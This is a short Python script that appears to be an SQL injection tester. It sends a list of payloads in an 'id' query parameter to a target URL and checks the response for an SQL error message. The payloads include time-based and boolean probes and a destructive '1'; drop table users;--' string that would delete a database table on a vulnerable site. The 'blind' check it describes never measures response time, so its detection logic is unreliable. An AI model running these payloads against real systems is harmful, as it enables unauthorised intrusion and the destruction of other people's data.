import requests
from bs4 import BeautifulSoup

# Define the target URL
url = "https://example.com"

# Define the injection payloads to test
payloads = [
    "1' and sleep(10)--",
    "1' and 1=1--",
    "1' and 1=0--",
    "1'; drop table users;--"
]

# Function to test for SQL injection vulnerability using blind technique
def test_sql_injection(url, injection_string):
    # Append the injection string to the URL
    url = f"{url}?id={injection_string}"

    # Send the HTTP request and receive the response
    response = requests.get(url)

    # Extract the response content
    soup = BeautifulSoup(response.content, 'html.parser')

    # Analyze the response content for evidence of a successful injection
    if "Error executing SQL statement" in soup.text:
        print(f"SQL injection vulnerability detected with injection string: {injection_string}")
    else:
        print(f"No SQL injection vulnerabilities detected with injection string: {injection_string}")

# Test for SQL injection using different injection payloads
for payload in payloads:
    test_sql_injection(url, payload)
